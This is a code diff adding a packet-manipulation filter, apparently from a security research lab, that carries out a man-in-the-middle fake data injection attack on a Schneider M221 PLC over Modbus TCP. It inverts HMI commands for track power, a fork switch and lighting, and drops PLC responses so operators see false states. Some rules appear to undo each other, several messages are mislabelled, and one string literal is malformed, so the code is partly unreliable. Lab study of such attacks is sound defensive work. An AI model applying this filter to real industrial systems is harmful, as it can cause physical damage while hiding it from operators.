@@ -1,0 +1,77 @@
+#-----------------------------------------------------------------------------
+# Name:        m221_2 filter
+#
+# Purpose:     This filter is used to do the fake data injection attack for the 
+#              Schneider m221 PLC system.[PLC3: 192.168.10.71<-> 192.168.10.21]
+# Author:      Yuancheng Liu
+#
+# Created:     2019/09/09
+# Copyright:   YC @ Singtel Cyber Security Research & Development Laboratory
+# License:     YC
+#-----------------------------------------------------------------------------
+
+#Reverse the memory change signal from HMI to PLC.
+if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.71') {
+
+    # M0 -> Q0.0 Fork switch
+    if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x00\x00\x01\x01\x00", "\x0f\x00\x00\x00\x01\x01\x01");
+        msg("Reverse Fork switch off request.\n");
+    }
+    if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x00\x00\x01\x01\x01", "\x0f\x00\x00\x00\x01\x01\x00");
+        msg("Reverse Fork switch on request.\n");
+    }
+
+    # M10 -> Q0.1 track A pwr
+    if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x0a\x00\x01\x01\x00", "\x0f\x00\x0a\x00\x01\x01\x01");
+        msg("Reverse track A pwr off request.\n");
+    }
+
+    if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x0a\x00\x01\x01\x01", "\x0f\x00\x0a\x00\x01\x01\x00");
+        msg("Reverse track A pwr off request.\n");
+    }
+
+    # M20 -> Q0.2 track B pwr
+    if (search(DATA.data ,"\x0f\x00\x14\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x14\x00\x01\x01\x00", "\x0f\x00\x14\x00\x01\x01\x01");
+        msg("Reverse track B pwr off request.\n");
+    }
+
+    if (search(DATA.data ,"\x0f\x00\x14\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x14\x00\x01\x01\x01", "\x0f\x00\x14\x00\x01\x01\x00");
+        msg("Reverse track B pwr off request.\n");
+    }
+
+
+    # M60 -> Q0.3 city LED
+    if (search(DATA.data ,"\x0f\x00\x3c\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x3c\x00\x01\x01\x00", "\x0f\x00\x3c\x00\x01\x01\x01");
+        msg("Reverse city LED off request.\n");
+    }
+
+    if (search(DATA.data ,"\x0f\x00\x3c\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x3c\x00\x01\x01\x01", "\x0f\x00\x3c\x00\x01\x01\x00");
+        msg("Reverse city LED off request.\n");
+    }
+}
+
+# Drop the memory change signal from HMI to PLC.
+if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.71')  {
+    # Drop the PLC response.
+    if (search(DATA.data ,"\x00\x00\x00\x00\x00\x08\x01\x01")) {
+        drop();
+        msg("Drop the read request!\n");
+    }
+}
+
+#Reverse the PLC response to HMI.
+if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '192.168.10.21') {
+    # Drop the PLC response.
+    if (search(DATA.data ,"\x01\x08\")) {
+        drop();
+        msg("Drop the response!\n");
+    }
+}
